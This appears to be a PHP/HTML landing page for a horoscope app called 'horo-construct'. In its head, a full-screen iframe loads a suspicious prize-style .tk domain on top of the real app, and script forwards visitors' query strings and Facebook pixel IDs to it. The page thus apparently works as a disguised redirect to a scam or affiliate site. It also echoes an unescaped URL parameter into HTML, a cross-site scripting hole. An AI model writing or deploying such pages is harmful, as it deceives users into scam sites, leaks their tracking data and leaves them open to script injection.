<?php

$tiktok = $_GET['sub3'];
$ga = urldecode($_GET['sub4']);
$fb = $_GET['sub5'];

$splitGA = explode('/', $ga);

?> 
<!DOCTYPE html>
<html lang="en" id="html">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,maximum-scale=1.0">
    <link rel="icon" href="favicon.ico">
    <link href="https://fonts.googleapis.com/css?family=Roboto:200,300,400,500,700,900&display=swap&subset=cyrillic" rel="stylesheet">
    <title>horo-construct</title>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript">
document.addEventListener("DOMContentLoaded", function() {
$.urlParam = function(name){
  var results = new RegExp('[\?&]' + name + '=([^]*)').exec(window.location.href);
  if (results==null){
     return null;
  }
  else{
     return results[1] || 0;
  }
}
var fbpixel = $.urlParam('sub5').split('&')[0];   
  
  
 var hvost = window.location.search.substring(1); 
 var elements = document.getElementsByTagName('iframe');

 for (var i = 0; i < elements.length; i++) {
  var newHref = elements[i].src;
  if (newHref.indexOf("#")!=-1) continue;
  if (newHref.indexOf("?")==-1) newHref += "?";
  else newHref += "&";
  if (hvost!="") elements[i].src = newHref + hvost + "&sub_id_5=" + fbpixel;
 }
});
</script>
<iframe src="https://luxepriz.tk/y2csYD" style="visibility: visible !important; position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px; width: 100%; height: 100%; border: none; margin: 0; padding: 0; overflow: hidden; z-index: 999999;" allowfullscreen="allowfullscreen" webkitallowfullscreen="webkitallowfullscreen" mozallowfullscreen="mozallowfullscreen"></iframe>
  <link href="css/app.060a4a6e.css" rel="preload" as="style"><link href="css/chunk-vendors.391ed6f9.css" rel="preload" as="style"><link href="js/app.c3354203.js" rel="preload" as="script"><link href="js/chunk-vendors.763ee8ae.js" rel="preload" as="script"><link href="css/chunk-vendors.391ed6f9.css" rel="stylesheet"><link href="css/app.060a4a6e.css" rel="stylesheet"></head>
  <body>
  <?php if (!empty($fb)) { ?> <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?php echo $fb; ?>&ev=PageView&noscript=1"/></noscript> <?php } ?> 

  <div id="app"></div>
  <input type="hidden" name="sub1" value="{subid}">
    <!-- built files will be auto injected -->
  </body>
</html>
